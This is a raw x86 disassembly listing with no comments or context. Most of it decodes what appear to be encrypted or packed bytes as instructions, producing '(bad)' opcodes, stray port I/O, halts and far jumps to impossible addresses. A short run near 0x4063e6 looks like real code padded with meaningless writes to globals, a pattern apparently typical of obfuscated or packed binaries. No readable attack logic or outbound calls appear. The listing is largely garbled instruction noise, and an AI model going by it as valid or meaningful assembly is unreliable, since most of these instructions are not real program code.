  406166:	sar    DWORD PTR [ebx-0x25281150],cl
  40616c:	mov    ah,0xbe
  40616e:	fcmovnu st,st(3)
  406170:	shl    ebp,0xc4
  406173:	(bad)  
  406175:	out    0xe6,al
  406177:	repz out 0xcc,al
  40617a:	jmp    0x406145
  40617c:	retf   
  40617d:	jmp    0xcf0e2343
  406182:	cmc    
  406183:	mov    eax,0xd9fdd2b6
  406188:	cld    
  406189:	fmulp  st(4),st
  40618b:	add    DWORD PTR [edi+0x1fcc4bc],edi
  406191:	sti    
  406192:	dec    DWORD PTR [ecx]
  406194:	or     eax,0xcbe2fee4
  406199:	ret    0xbdf1
  40619c:	(bad)  
  40619d:	(bad)  
  40619f:	mov    bl,0xc5
  4061a1:	mov    ah,0xd8
  4061a3:	jmp    0xa5c94
  4061a8:	repnz fadd st(3),st
  4061ab:	sar    ch,1
  4061ad:	repz aam 0xb
  4061b0:	clc    
  4061b1:	in     al,0xe3
  4061b3:	retf   
  4061b4:	loopne 0x4061c5
  4061b6:	hlt    
  4061b7:	into   
  4061b8:	(bad)  
  4061ba:	jmp    0xeaf5:0xb0edc8f6
  4061c1:	mov    cl,0xf2
  4061c3:	retf   
  4061c4:	shl    ecx,1
  4061c6:	repz fcmovnu st,st(3)
  4061c9:	into   
  4061ca:	inc    BYTE PTR [edi]
  4061cc:	mov    eax,0xe9f4d0c1
  4061d1:	add    esi,esp
  4061d3:	add    al,0xd9
  4061d5:	(bad)  
  4061d6:	out    0xcb,al
  4061d8:	std    
  4061d9:	loopne 0x40619f
  4061db:	in     al,dx
  4061dc:	scas   al,BYTE PTR es:[edi]
  4061dd:	loop   0x4061cc
  4061df:	int3   
  4061e0:	lods   al,BYTE PTR ds:[esi]
  4061e1:	div    BYTE PTR [edx-0x320001a]
  4061e7:	mov    esi,0xd7efcff0
  4061ec:	cmc    
  4061ed:	fcmovnb st,st(7)
  4061ef:	cli    
  4061f0:	out    0xf8,al
  4061f2:	aad    0xc4
  4061f4:	out    dx,al
  4061f5:	cmc    
  4061f6:	jmp    0x4061c3
  4061f8:	or     edx,ebx
  4061fa:	enter  0xcaa8,0xb1
  4061fe:	(bad)  
  406200:	mov    ah,0xb9
  406202:	stc    
  406203:	mov    ecx,0xfebfebbe
  406208:	mov    ecx,0xbff3e3e1
  40620d:	mov    esi,0xfe02b9e1
  406212:	retf   0xf6dd
  406215:	les    eax,FWORD PTR [edx]
  406217:	add    al,0xd9
  406219:	(bad)  
  40621a:	mov    edi,0xb7c3c4b3
  40621f:	enter  0xecd0,0xb6
  406223:	(bad)  
  406224:	retf   
  406225:	retf   0xbbed
  406228:	mov    ebp,0x6f4f7db
  40622d:	ret    0xd0c7
  406230:	fyl2xp1 
  406232:	add    eax,0x200efe3
  406237:	fdiv   st(0),st
  406239:	scas   eax,DWORD PTR es:[edi]
  40623a:	sar    BYTE PTR [edi-0x4438480d],0xfb
  406241:	xlat   BYTE PTR ds:[ebx]
  406242:	(bad)  
  406243:	in     eax,dx
  406244:	(bad)  
  406246:	leave  
  406247:	std    
  406248:	enter  0xe1d9,0xc3
  40624c:	lock in eax,dx
  40624e:	jmp    0x406241
  406250:	sar    ah,1
  406252:	cld    
  406253:	fsubr  st,st(1)
  406255:	add    cl,ah
  406257:	out    dx,al
  406258:	iret   
  406259:	ret    0xf7f3
  40625c:	out    0xd0,al
  40625e:	enter  0xc4fb,0xee
  406262:	idiv   bh
  406264:	mov    ah,0xcf
  406266:	repnz mov ecx,0xced2c2ba
  40626c:	icebp  
  40626d:	add    ebx,esp
  40626f:	add    DWORD PTR [ebx],ecx
  406271:	clc    
  406272:	(bad)  
  406273:	cli    
  406274:	aam    0xcd
  406276:	movntq (bad),mm1
  406277:	out    0xcd,eax
  406279:	in     eax,dx
  40627a:	out    0xdf,eax
  40627c:	rcl    ah,cl
  40627e:	lock leave 
  406280:	sar    cl,0xc5
  406283:	leave  
  406284:	aad    0xd3
  406286:	in     al,0xee
  406288:	(bad)  
  406289:	hlt    
  40628a:	in     al,dx
  40628b:	mov    esp,0xc2e7e7e5
  406290:	loopne 0x406292
  406292:	in     al,0xfa
  406294:	jmp    0xcf446f84
  406299:	in     al,dx
  40629a:	mov    esi,0xb1d1cbd2
  40629f:	jmp    0xc02e277a
  4062a4:	hlt    
  4062a5:	repz fcom st(2)
  4062a8:	call   esi
  4062aa:	in     al,dx
  4062ab:	(bad)  
  4062ac:	div    ecx
  4062ae:	add    al,0xdc
  4062b0:	shl    cl,0xca
  4062b3:	out    dx,al
  4062b4:	cld    
  4062b5:	in     al,0xc5
  4062b7:	sti    
  4062b8:	out    dx,eax
  4062b9:	scas   al,BYTE PTR es:[edi]
  4062ba:	out    dx,eax
  4062bb:	shl    ebx,0xe0
  4062be:	in     al,0xe0
  4062c0:	(bad)  
  4062c1:	clc    
  4062c2:	mov    bh,0xd8
  4062c4:	icebp  
  4062c5:	mov    edx,0xbcd5beda
  4062ca:	sar    BYTE PTR [ecx-0x6130e14],cl
  4062d0:	add    al,0xf0
  4062d2:	cmc    
  4062d3:	loopne 0x4062ae
  4062d5:	call   0xe34f70e0
  4062da:	out    dx,eax
  4062db:	(bad)  
  4062dd:	rol    bl,0xf4
  4062e0:	aad    0xd7
  4062e2:	loopne 0x40629c
  4062e4:	xlat   BYTE PTR ds:[ebx]
  4062e5:	std    
  4062e6:	fmulp  st(4),st
  4062e8:	mov    ecx,0xe3bde2e9
  4062ed:	mov    DWORD PTR [ecx],0xfbf507df
  4062f3:	out    0xef,eax
  4062f5:	out    dx,al
  4062f6:	(bad)
  4062f9:	retf   0xedc9
  4062fc:	repnz rcl ch,cl
  4062ff:	lock call 0xcef25ee6
  406305:	fsub   st(7),st
  406307:	loop   0x4062f6
  406309:	int    0xf2
  40630b:	mov    ecx,0xafdbfd0
  406310:	rol    edx,1
  406312:	enter  0xd90e,0xc
  406316:	(bad)  
  406318:	leave  
  406319:	mov    bl,0xaf
  40631b:	loope  0x40630e
  40631d:	cmc    
  40631e:	retf   0xb7d0
  406321:	call   0xd81f3af9
  406326:	mov    esi,0xfaefcad5
  40632b:	(bad)  
  40632d:	cli    
  40632e:	repz push es
  406330:	(bad)  
  406332:	push   es
  406333:	neg    ah
  406335:	sti    
  406336:	in     eax,0xe7
  406338:	out    0xf3,al
  40633a:	loopne 0x40632f
  40633c:	jmp    0xeff0:0xedb2f3d4
  406343:	push   DWORD PTR [edi-0xb163211]
  406349:	cld    
  40634a:	mov    edi,0xdbf9fdc2
  40634f:	cli    
  406350:	repnz add eax,0xa0be4fd
  406356:	out    0xef,eax
  406358:	fsubrp st(2),st
  40635a:	(bad)  
  40635b:	retf   
  40635c:	shr    BYTE PTR [ebx-0x144d0b54],0xe0
  406363:	out    0xe6,eax
  406365:	fxtract 
  406367:	into   
  406368:	jecxz  0x406332
  40636a:	jmp    edx
  40636c:	fnop   
  40636e:	ror    ebx,1
  406370:	fcomip st,st(6)
  406372:	loope  0x40637e
  406374:	out    0xe5,eax
  406376:	adc    esi,ebx
  406378:	jmp    0x406349
  40637a:	jecxz  0x406339
  40637c:	mov    cl,0xf3
  40637e:	repnz repnz loope 0x406358
  406382:	repnz in eax,dx
  406384:	div    esi
  406386:	idiv   ecx
  406388:	(bad)  
  40638a:	lock xlat BYTE PTR ds:[ebx]
  40638c:	cmc    
  40638d:	mov    esp,0xf4fadbfb
  406392:	test   bl,0xf9
  406395:	or     dh,ah
  406397:	loopne 0x406397
  406399:	mov    ebp,0xb5aeece4
  40639e:	out    0xc3,eax
  4063a0:	fld    st(4)
  4063a2:	mul    ebp
  4063a4:	mov    ecx,0xc9cdfef5
  4063a9:	leave  
  4063aa:	fdivr  DWORD PTR [ebp-0x42022241]
  4063b0:	jmp    0xebdb:0xfc01dcd7
  4063b7:	push   es
  4063b8:	adc    cl,ch
  4063ba:	xlat   BYTE PTR ds:[ebx]
  4063bb:	(bad)  
  4063bc:	xlat   BYTE PTR ds:[ebx]
  4063bd:	mov    ch,0xea
  4063bf:	repnz ror ch,1
  4063c2:	imul   edi
  4063c4:	jmp    0xd9f4:0xcef1faf3
  4063cb:	out    0xc1,eax
  4063cd:	loopne 0x406393
  4063cf:	jmp    0x4063ac
  4063d1:	mov    edi,0xdbc5fdca
  4063d6:	loope  0x4063a5
  4063d8:	add    edi,ebp
  4063da:	les    eax,FWORD PTR [ebx-0x38a9af14]
  4063e0:	inc    ebp
  4063e1:	cld    
  4063e2:	and    esi,DWORD PTR [ebx+eax*2+0x0]
  4063e6:	dec    DWORD PTR ds:0x43771f
  4063ec:	mov    DWORD PTR [ebp-0x8],0x43742b
  4063f3:	or     DWORD PTR ds:0x437767,0x43777f
  4063fd:	lea    eax,[ebp-0x18]
  406400:	inc    DWORD PTR ds:0x4377a3
  406406:	mov    DWORD PTR [ebp-0xc],eax
  406409:	dec    DWORD PTR ds:0x43772b
  40640f:	mov    eax,DWORD PTR [ebp-0xc]
  406412:	mov    DWORD PTR [eax],0x70941f82
  406418:	mov    DWORD PTR [eax+0x4],0xffffffff
  40641f:	sub    eax,DWORD PTR ds:0x43770f
  406425:	mov    eax,ds:0x43739f
  40642a:	inc    DWORD PTR ds:0x43775b
  406430:	mov    eax,DWORD PTR [eax+0x1c0]
  406436:	or     DWORD PTR ds:0x4377ab,0x72ba
  406440:	mov    eax,DWORD PTR [eax]
  406442:	sub    DWORD PTR ds:0x437763,0x437723
  40644c:	xor    ecx,ecx
  40644e:	sbb    DWORD PTR ds:0x43779f,0x733b
  406458:	sub    eax,0x5424137
  40645d:	mov    DWORD PTR ds:0x4377a3,0x54e3
  406467:	sbb    ecx,0x0
  40646a:	xor    eax,0x8a29a14b
  40646f:	xor    ecx,0x0
  406472:	mov    DWORD PTR ds:0x43779f,0x3ce1
  40647c:	mov    DWORD PTR [ebp-0x20],eax
  40647f:	mov    DWORD PTR [ebp-0x1c],ecx
  406482:	mov    DWORD PTR ds:0x43777f,0x5274
  40648c:	cmp    DWORD PTR [ebp-0x20],0x70941f81
  406493:	jne    0x4089fc
  406499:	mov    DWORD PTR ds:0x437743,0x6c71
  4064a3:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  4064a7:	jne    0x4089fc
  4064ad:	sbb    DWORD PTR ds:0x43778b,edx
  4064b3:	mov    eax,DWORD PTR [ebp-0x8]
  4064b6:	and    DWORD PTR ds:0x437753,0x437727
  4064c0:	mov    eax,DWORD PTR [eax]
  4064c2:	xor    ecx,ecx
  4064c4:	sub    eax,0x5424137
  4064c9:	jmp    0x408817
  4064ce:	mov    ds:0xf452acdf,al
  4064d3:	push   eax
  4064d4:	outs   dx,DWORD PTR fs:[esi]
  4064d6:	jbe    0x406527
  4064d8:	loope  0x406479
  4064da:	cmp    DWORD PTR [ecx-0x4226bd5c],ebp
  4064e0:	jnp    0x40655d
  4064e2:	stos   BYTE PTR es:[edi],al
  4064e3:	cwde   
  4064e4:	jnp    0x406561
  4064e6:	in     al,dx
  4064e7:	shl    esp,0xcc
  4064ea:	into   
  4064eb:	leave  
  4064ec:	jmp    0x4064b8
  4064ee:	not    edx
  4064f0:	mov    edx,0xdbffd5cd
  4064f5:	mov    ebp,0x506decf
  4064fa:	or     dh,dh
  4064fc:	fprem1 
  4064fe:	fdivp  st(3),st
  406500:	add    al,0xe7
  406502:	jmp    0xd72d1000
  406507:	(bad)  
  406508:	mov    cl,0xc2
  40650a:	sti    
  40650b:	in     eax,0xe7
  40650d:	mov    ecx,0xf7fcd9fa
  406512:	leave  
  406513:	repnz loope 0x4064d0
  406516:	imul   esi
  406518:	lock shl ebp,0xca
  40651c:	aad    0xfc
  40651e:	cld    
  40651f:	pop    es
  406520:	out    0xc8,al
  406522:	loopne 0x4064ef
  406524:	mov    dl,0xc9
  406526:	test   eax,0xe8b4acc7
  40652b:	iret   
  40652c:	fxam   
  40652e:	jmp    0xb53c2a19
  406533:	mov    ebp,0xd8c3dae0
  406538:	test   al,0xc3
  40653b:	fadd   QWORD PTR [ecx]
  40653d:	add    ch,dh
  40653f:	mov    esp,0x9cfc2c7
  406544:	icebp  
  406545:	lock int3 
  406547:	in     eax,0xcc
  406549:	out    0xd4,eax
  40654b:	(bad)  
  40654c:	repnz out 0xf4,eax
  40654f:	(bad)  
  406551:	clc    
  406552:	mov    ah,0xcd
  406554:	fyl2xp1 
  406556:	mov    ch,0xec
  406558:	mov    esi,0xf0c205f9
  40655d:	add    eax,0xbeec4f4
  406562:	or     esi,ebx
  406564:	out    dx,al
  406565:	repnz retf 0xe7cd
  406569:	mov    bh,0xce
  40656b:	lods   al,BYTE PTR ds:[esi]
  40656c:	icebp  
  40656d:	shl    BYTE PTR [esi-0x1c062416],0x2
  406574:	aam    0xf2
  406576:	shl    al,1
  406578:	out    0xf3,al
  40657a:	pop    es
  40657b:	pop    es
  40657c:	div    al
  40657e:	jmp    0x406574
  406580:	add    esp,ebx
  406582:	(bad)  
  406583:	fucomp st(5)
  406585:	loopne 0x406578
  406587:	(bad)  
  406589:	mov    dh,0xc7
  40658b:	stc    
  40658c:	not    esp
  40658e:	out    dx,al
  40658f:	sti    
  406590:	(bad)  
  406591:	cld    
  406592:	mov    edx,0xf9fae2dd
  406597:	cli    
  406598:	(bad)  
  40659a:	add    edi,DWORD PTR [eax-0x51f281a]
  4065a0:	out    0xd8,al
  4065a2:	add    eax,0xebbdbfe2
  4065a7:	in     eax,dx
  4065a8:	mov    ebp,0xd4c9e3aa
  4065ad:	cli    
  4065ae:	call   0xd2f939ae
  4065b3:	into   
  4065b4:	mov    esi,0x2eec1d1
  4065b9:	(bad)  
  4065bb:	jmp    0xd9c6:0xf8cfc8e2
  4065c2:	lds    ecx,FWORD PTR [eax]
  4065c4:	retf   
  4065c5:	ret    
  4065c6:	mov    esp,0xcdc0b3dc
  4065cb:	enter  0xc0d2,0xfe
  4065cf:	retf   0xefb3
  4065d2:	cli    
  4065d3:	ret    
  4065d4:	(bad)  
  4065d5:	clc    
  4065d6:	ret    0xdbd7
  4065d9:	loop   0x4065bf
  4065db:	(bad)  
  4065dd:	push   es
  4065de:	jmp    0x4065d9
  4065e0:	fsubr  st(0),st
  4065e2:	jecxz  0x4065e9
  4065e4:	test   al,0xf0
  4065e6:	(bad)
  4065e9:	shl    ch,1
  4065eb:	icebp  
  4065ec:	mov    bh,0xca
  4065ee:	(bad)  
  4065ef:	stc    
  4065f0:	rcl    bh,1
  4065f2:	aam    0xba
  4065f4:	sar    eax,0xd9
  4065f7:	mov    esp,0xc602d1fa
  4065fc:	fadd   DWORD PTR [ebx]
  4065fe:	out    0xce,eax
  406600:	out    dx,eax
  406601:	add    ebp,esi
  406603:	fild   QWORD PTR [ebx-0x2e1b1933]
  406609:	leave  
  40660a:	retf   
  40660b:	mov    edx,0xbad4f4f1
  406610:	call   0xd7135906
  406615:	stc    
  406616:	hlt    
  406617:	(bad)  
  406618:	cli    
  406619:	fcmovnb st,st(4)
  40661b:	add    eax,0xeac001fc
  406620:	add    al,0xff
  406622:	in     eax,dx
  406623:	std    
  406624:	mov    esp,0xd5d7e8ad
  406629:	int3   
  40662a:	out    0xa8,al
  40662c:	stc    
  40662d:	scas   al,BYTE PTR es:[edi]
  40662e:	leave  
  40662f:	out    dx,al
  406630:	int    0xfc
  406632:	sti    
  406633:	std    
  406634:	add    cl,ah
  406636:	mov    ch,0xfc
  406638:	sar    edi,cl
  40663a:	mov    esp,0xd9f907fe
  40663f:	out    0xf9,al
  406641:	or     al,0xc5
  406643:	in     eax,dx
  406644:	into   
  406645:	ffree  st(1)
  406647:	retf   0xaeea
  40664a:	jmp    0xe9165037
  40664f:	hlt    
  406650:	in     al,dx
  406651:	repz imul eax
  406654:	lock stc 
  406656:	ret    0xc6fa
  406659:	add    al,0x2
  40665b:	loope  0x406622
  40665d:	(bad)  
  40665e:	enter  0xe2fa,0xc2
  406662:	loop   0x40665c
  406664:	(bad)  
  406666:	jmp    0x406653
  406668:	test   dl,0xcb
  40666b:	mov    bl,0xc5
  40666d:	out    0xd1,eax
  40666f:	(bad)  
  406670:	stc    
  406671:	fld    st(3)
  406673:	out    dx,al
  406674:	sar    BYTE PTR [ecx+0x201c3fa],1
  40667a:	mov    esp,0xebe7d0c3
  40667f:	jmp    0xdcd9:0xccccfc08
  406686:	(bad)  
  406687:	in     eax,dx
  406688:	scas   al,BYTE PTR es:[edi]
  406689:	mov    bl,0xbb
  40668b:	loope  0x406662
  40668d:	rcr    edi,cl
  40668f:	leave  
  406690:	cmc    
  406691:	cli    
  406692:	idiv   DWORD PTR [eax-0x38021346]
  406698:	aam    0xd2
  40669a:	sar    al,cl
  40669c:	fucom  st(4)
  40669e:	or     edx,ebp
  4066a0:	in     al,0xc
  4066a2:	or     ah,bl
  4066a4:	jmp    0xe1f2286b
  4066a9:	retf   
  4066aa:	out    0xf2,eax
  4066ac:	iret   
  4066ad:	(bad)
  4066b0:	fprem  
  4066b2:	fstp   TBYTE PTR [ebx-0x1e3e2a27]
  4066b8:	mov    ch,0xe1
  4066bb:	ret    
  4066bc:	mov    edi,0x2fbf8d0
  4066c1:	fxch   st(6)
  4066c3:	clc    
  4066c4:	fucomip st,st(0)
  4066c6:	(bad)  
  4066c7:	int3   
  4066c8:	out    dx,eax
  4066c9:	mov    bh,0xb3
  4066cb:	mov    al,0xef
  4066cd:	fadd   st,st(6)
  4066cf:	(bad)  
  4066d0:	fcmovu st,st(7)
  4066d2:	jmp    0x4066c6
  4066d4:	shr    ebp,1
  4066d6:	sar    esp,cl
  4066d8:	aad    0xf3
  4066da:	(bad)
  4066dd:	idiv   dl
  4066df:	aad    0xcd
  4066e1:	dec    DWORD PTR [eax]
  4066e3:	cmpxchg edi,ecx
  4066e6:	shl    DWORD PTR [edx-0x101f2e2e],0xf9
  4066ed:	mov    bh,0xc9
  4066ef:	fcmovbe st,st(6)
  4066f1:	repz in eax,dx
  4066f3:	lock add dh,bh
  4066f6:	push   es
  4066f7:	add    al,BYTE PTR [ebx]
  4066f9:	add    esp,edx
  4066fb:	(bad)
  4066fe:	paddusb mm1,mm2
  406701:	repz fld DWORD PTR [edx]
  406704:	jmp    0xe7223ab7
  406709:	out    0xcf,al
  40670b:	loope  0x406701
  40670d:	retf   0xf4c8
  406710:	fcmovnbe st,st(0)
  406712:	out    dx,eax
  406713:	leave  
  406714:	hlt    
  406715:	sti    
  406716:	mov    ebp,0xc4ddece1
  40671b:	loopne 0x4066f8
  40671d:	call   0xe724712d
  406722:	add    edi,edi
  406724:	lock shl DWORD PTR [ebp-0x2e35091c],0xc0
  40672c:	(bad)
  40672f:	out    dx,al
  406730:	in     eax,0xb2
  406732:	add    esi,esp
  406734:	repnz pop es
  406736:	cmc    
  406737:	(bad)  
  406738:	(bad)  
  406739:	aam    0xf5
  40673b:	neg    dh
  40673d:	mov    esi,0x3f5ebc6
  406742:	add    ch,al
  406744:	loopne 0x406739
  406746:	jecxz  0x406731
  406748:	loope  0x406719
  40674a:	jecxz  0x40672c
  40674c:	out    dx,al
  40674d:	(bad)  
  40674f:	aad    0xd0
  406751:	into   
  406752:	in     eax,dx
  406753:	in     eax,dx
  406754:	xlat   BYTE PTR ds:[ebx]
  406755:	ret    
  406756:	in     al,dx
  406757:	cmc    
  406758:	rcl    dl,cl
  40675a:	loope  0x406718
  40675c:	retf   
  40675d:	fstp   st(4)
  40675f:	dec    al
  406761:	cli    
  406762:	or     eax,0xe2ebe1e9
  406767:	mov    ebp,0xe4c7e5d4
  40676c:	repnz sti 
  40676e:	fxch   st(6)
  406770:	mov    ch,0x3
  406772:	retf   
  406773:	ret    
  406774:	mov    esi,0xedfdbff4
  406779:	push   es
  40677a:	cli    
  40677b:	retf   
  40677c:	aam    0xe9
  40677e:	iret   
  40677f:	cli    
  406780:	push   es
  406781:	or     ch,cl
  406783:	or     eax,0xe1e6afbe
  406788:	sar    BYTE PTR [esp+edx*8-0x416052a],cl
  40678f:	(bad)
  406792:	out    dx,eax
  406793:	lock repz out dx,al
  406796:	mov    esi,0xb9fcd9db
  40679b:	or     edi,ebx
  40679d:	hlt    
  40679e:	cmc    
  40679f:	fisttp WORD PTR [edx]
  4067a1:	jmp    0xc3f7:0xbfbfe8cf
  4067a8:	icebp  
  4067a9:	cmc    
  4067aa:	in     al,0xee
  4067ac:	iret   
  4067ad:	call   0xca1e5685
  4067b2:	sar    edi,cl
  4067b4:	(bad)  
  4067b5:	aam    0xf2
  4067b7:	aad    0xd5
  4067b9:	out    0xe0,al
  4067bb:	fiadd  WORD PTR [eax]
  4067bd:	push   es
  4067be:	loop   0x4067c1
  4067c0:	std    
  4067c1:	out    0xff,al
  4067c3:	into   
  4067c4:	int3   
  4067c5:	test   esi,0xe9ecc9f6
  4067cb:	mov    ch,0xe7
  4067cd:	in     eax,0xad
  4067cf:	aad    0xf7
  4067d1:	clc    
  4067d2:	int    0xfd
  4067d4:	jecxz  0x4067b4
  4067d6:	add    bh,BYTE PTR [esi+0x3e0bdd1]
  4067dc:	or     bl,bh
  4067de:	leave  
  4067df:	hlt    
  4067e0:	cmc    
  4067e1:	cli    
  4067e2:	cli    
  4067e3:	jmp    0xf6f245da
  4067e8:	aad    0xf7
  4067ea:	mov    ah,0xb1
  4067ec:	call   0xb6203ad0
  4067f1:	(bad)  
  4067f3:	retf   0xf6d5
  4067f6:	mov    edi,0xdfd8da07
  4067fb:	hlt    
  4067fc:	(bad)  
  4067fd:	xlat   BYTE PTR ds:[ebx]
  4067fe:	jecxz  0x4067ed
  406800:	or     al,BYTE PTR [edi]
  406802:	or     BYTE PTR [ebx],al
  406804:	les    esi,FWORD PTR [ebx-0x4d164233]
  40680a:	in     eax,dx
  40680b:	(bad)  
  40680c:	retf   0xcbf1
  40680f:	retf   
  406810:	sar    DWORD PTR [ebx-0x1302230f],1
  406816:	sar    DWORD PTR [esi-0x2f1f3c3f],0xdc
  40681d:	les    ecx,FWORD PTR [esi]
  40681f:	push   es
  406820:	(bad)  
  406821:	fcmovne st,st(6)
  406823:	out    dx,al
  406824:	jmp    0x406802
  406826:	shr    al,1
  406828:	mov    bl,0xdc
  40682a:	mov    ebx,0xf3c9dbc4
  40682f:	cli    
  406830:	fnstsw WORD PTR [esi-0x21174733]
  406836:	ret    
  406837:	not    ebp
  406839:	fcomip st,st(7)
  40683b:	repnz hlt 
  40683d:	add    al,0xef
  40683f:	clts   
  406841:	fild   DWORD PTR [ebx]
  406843:	clc    
  406844:	lock mov edi,0xd4c0c1d3
  40684a:	icebp  
  40684b:	shl    ah,1
  40684d:	repnz rcr edi,1
  406850:	cmc    
  406851:	mov    ch,0xdf
  406853:	sar    BYTE PTR [esi-0x2090b1e],1
  406859:	add    al,0xe1
  40685b:	cmc    
  40685c:	retf   0xacb
  40685f:	loopne 0x406839
  406861:	push   es
  406862:	fiadd  DWORD PTR [esi]
  406864:	mov    esp,0xf0cbb3ac
  406869:	out    dx,al
  40686a:	int3   
  40686b:	repz in al,dx
  40686d:	in     eax,dx
  40686e:	lock jmp ebp
  406871:	icebp  
  406872:	fdivr  st,st(5)
  406874:	fucomi st,st(7)
  406876:	push   es
  406877:	std    
  406878:	std    
  406879:	aad    0x6
  40687b:	jmp    0xe428707d
  406880:	sti    
  406881:	or     al,0xe0
  406883:	sar    BYTE PTR [esi-0xb131932],0xea
  40688a:	mov    bl,0xb6
  40688c:	lock in eax,0xd8
  40688f:	imul   esp
  406891:	stc    
  406892:	retf   
  406893:	enter  0xe0ce,0x6
  406897:	push   es
  406898:	stc    
  406899:	clc    
  40689a:	add    al,0xf4
  40689c:	in     al,0xdc
  40689e:	hlt    
  40689f:	out    0x8,eax
  4068a1:	clc    
  4068a2:	in     al,0xc8
  4068a4:	loopne 0x406886
  4068a6:	loopne 0x40689f
  4068a8:	xlat   BYTE PTR ds:[ebx]
  4068a9:	int3   
  4068aa:	loopne 0x4068a5
  4068ac:	shl    esi,cl
  4068ae:	into   
  4068af:	lock int3 
  4068b1:	mov    ah,0xd8
  4068b3:	cld    
  4068b4:	lock mov edx,0xe4e505b9
  4068ba:	or     al,BYTE PTR [esi]
  4068bc:	add    eax,0xc7050bd6
  4068c1:	fsubrp st(5),st
  4068c3:	add    al,0xc1
  4068c5:	mov    esp,0xfbe5afe0
  4068ca:	in     al,0xe6
  4068cc:	mov    ah,0xc9
  4068ce:	xlat   BYTE PTR ds:[ebx]
  4068cf:	mov    ebx,0xfef6dcc4
  4068d4:	aad    0xf0
  4068d6:	sti    
  4068d7:	lock aam 0xc1
  4068da:	fld    DWORD PTR [edx]
  4068dc:	retf   
  4068dd:	or     ah,dh
  4068df:	or     bl,dl
  4068e1:	inc    BYTE PTR [esi]
  4068e3:	adc    ch,BYTE PTR [eax-0x12513d33]
  4068e9:	call   0xe02835cf
  4068ee:	aam    0xb9
  4068f0:	clc    
  4068f1:	add    ebx,esi
  4068f3:	(bad)  
  4068f4:	aad    0xe8
  4068f6:	lock rcl eax,cl
  4068f9:	cmc    
  4068fa:	lock out 0xf8,al
  4068fd:	fld    DWORD PTR [esi]
  4068ff:	or     dh,bl
  406901:	out    0x4,eax
  406903:	loope  0x4068d8
  406905:	lods   eax,DWORD PTR ds:[esi]
  406906:	mov    dl,0xf5
  406908:	mov    dh,0xc9
  40690a:	loop   0x4068bd
  40690c:	out    0xec,al
  40690e:	(bad)  
  40690f:	xlat   BYTE PTR ds:[ebx]
  406910:	(bad)  
  406911:	(bad)  
  406912:	mov    ah,0xba
  406914:	mov    esp,0xc307f4d6
  406919:	add    esi,edx
  40691b:	cli    
  40691c:	jmp    0x406925
  40691e:	loope  0x406922
  406920:	add    BYTE PTR [edx],al
  406922:	jmp    0xf2e2:0xdfacdde5
  406929:	shr    BYTE PTR [ebx+esi*8-0xe214f4f],1
  406930:	fcmovu st,st(5)
  406932:	shr    esi,cl
  406934:	(bad)  
  406936:	add    DWORD PTR ds:0xd1d5e1bb,eax
  40693c:	in     al,0xe2
  40693e:	loope  0x406914
  406940:	stc    
  406941:	jmp    0x40693c
  406943:	add    edx,ebp
  406945:	int    0xcc
  406947:	ror    esp,cl
  406949:	loop   0x406933
  40694b:	shl    bl,1
  40694d:	loopne 0x406933
  40694f:	(bad)  
  406950:	int3   
  406951:	cli    
  406952:	iret   
  406953:	(bad)  
  406955:	mov    edx,0xe6c503da
  40695a:	add    al,0xf2
  40695c:	(bad)  
  40695d:	std    
  40695e:	test   BYTE PTR [edx],0xc8
  406961:	fucomp st(3)
  406963:	push   cs
  406964:	(bad)  [edi-0x3b291433]
  40696a:	shl    DWORD PTR [edi-0x5308281b],cl
  406970:	mov    esi,0xccd4d8f6
  406975:	aam    0xcf
  406977:	shl    cl,1
  406979:	bnd ret 0xffd5
  40697d:	loopne 0x406953
  40697f:	out    dx,eax
  406980:	sti    
  406981:	fsubp  st(5),st
  406983:	cld    
  406984:	mov    esp,0xf0d1eecc
  406989:	mov    bh,0xd2
  40698b:	retf   
  40698c:	mov    bl,0xf3
  40698e:	(bad)  
  40698f:	hlt    
  406990:	mov    dh,0xdd
  406992:	mov    ah,0xfc
  406994:	sti    
  406995:	mov    ecx,0xfbecccdb
  40699a:	cli    
  40699b:	or     esi,edx
  40699d:	or     DWORD PTR [ebp+0xacfec0d],edi
  4069a3:	repnz test al,0xc2
  4069a6:	(bad)
  4069a9:	jmp    0xb8cc:0xdabac4b2
  4069b0:	aad    0xb8
  4069b2:	stc    
  4069b3:	cli    
  4069b4:	xlat   BYTE PTR ds:[ebx]
  4069b5:	(bad)  
  4069b6:	ror    ah,cl
  4069b8:	(bad)  
  4069b9:	aam    0xe5
  4069bb:	add    edi,esp
  4069bd:	out    dx,eax
  4069be:	std    
  4069bf:	pop    es
  4069c0:	(bad)  
  4069c2:	push   es
  4069c3:	out    0xac,eax
  4069c5:	retf   
  4069c6:	loope  0x40697a
  4069c8:	mov    esp,0xf9fae6e2
  4069cd:	test   bh,0xd2
  4069d0:	mov    esi,0xecdbebf5
  4069d5:	jecxz  0x4069a5
  4069d7:	mov    esi,0xc4d2e0cc
  4069dc:	pop    es
  4069dd:	(bad)  
  4069de:	std    
  4069df:	jmp    0x84f68ab
  4069e4:	fsubr  DWORD PTR [ecx-0x120a1115]
  4069ea:	cli    
  4069eb:	retf   
  4069ec:	in     al,dx
  4069ed:	aam    0xe8
  4069ef:	sar    bl,1
  4069f1:	mov    ebx,0xeef0d1d7
  4069f6:	mul    eax
  4069f8:	in     al,dx
  4069f9:	(bad)  
  4069fb:	mov    DWORD PTR [eax],0x3c5fada
  406a01:	out    0xd9,al
  406a03:	stc    
  406a04:	repz scas al,BYTE PTR es:[edi]
  406a06:	mov    ebx,0xd0d3fbb5
  406a0c:	out    0xc5,eax
  406a0e:	jmp    0xbfd9:0xb5f6b7fb
  406a15:	loop   0x406a16
  406a17:	test   ch,0xcc
  406a1a:	fdiv   st(0),st
  406a1c:	add    ebx,ebp
  406a1e:	aad    0xe8
  406a20:	in     eax,dx
  406a21:	int    0x3
  406a23:	fcom   st(1)
  406a25:	(bad)  
  406a26:	jmp    0xe6d5:0xcae8f4c8
  406a2d:	mov    dl,0xd1
  406a2f:	fsubp  st(3),st
  406a31:	hlt    
  406a32:	mov    eax,0xe3f6f2b9
  406a37:	cmc    
  406a38:	(bad)  
  406a3a:	jecxz  0x406a27
  406a3c:	(bad)  
  406a3d:	xlat   BYTE PTR ds:[ebx]
  406a3e:	leave  
  406a3f:	push   es
  406a40:	in     al,dx
  406a41:	fisttp WORD PTR [esi]
  406a43:	out    dx,eax
  406a44:	(bad)  
  406a45:	loop   0x406a2d
  406a47:	scas   eax,DWORD PTR es:[edi]
  406a48:	mov    dh,0xfb
  406a4a:	(bad)  
  406a4b:	in     al,dx
  406a4c:	aam    0xd9
  406a4e:	out    dx,al
  406a4f:	leave  
